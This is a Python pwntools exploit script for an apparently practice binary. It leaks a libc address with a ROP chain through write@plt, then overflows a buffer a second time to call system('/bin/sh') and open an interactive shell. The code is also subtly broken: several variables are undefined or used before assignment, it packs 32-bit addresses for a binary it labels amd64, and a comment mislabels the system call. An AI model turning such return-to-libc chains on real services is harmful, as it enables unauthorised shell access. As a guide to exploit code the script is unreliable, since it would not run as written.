#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127 --port 9001 vuln_examples/pie
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('binary')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127'
port = int(args.PORT or 9001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

WRITEPLT = exe.plt['write']
PRINTFGOT = exe.got['printf']
MAIN = exe.symbols["main"] # You can get this from radare2 for example

ropchain = ''
ropchain += p32(WRITEPLT) # PRINTF function "call"
ropchain += p32(MAIN) # RETURN TO MAIN
ropchain += p32(0x1) # STDIN ARG[0]
ropchain += p32(PRINTFGOT) # PRINTF ADDRESS ARG[1]
ropchain += p32(0x4) # BYTES TO READ ARG[2]

io.recvline()
io.sendline(padding+ropchain)
io.recv(len(padding)+len(ropchain)) # reads the printf output

printf_addr = u32(r.recv(0x4))
libc_base = printf_addr - libc.symbols['printf']
libc.address = libc_base

log.info("libc " + hex(libc_base))
log.info("PRINTF 0x%x" % PRINTF)
log.info("SYSTEM 0x%x" % SYSTEM)
log.info("Binsh 0x%x" % BINSH)

SYSTEM = LIBCBASE + libc.symbols['system']
BINSH = LIBCBASE + 0x15900b

ropchain2 = p32(SYSTEM) # WRITE function "call"
ropchain2 += 'BBBB' # Return address doesn't really matter to where we return after shell
ropchain2 += p32(BINSH)

io.recvuntil('Hello pwners, \n')
io.sendline('A'*(112-8)+ropchain2)
io.recv()

io.interactive()

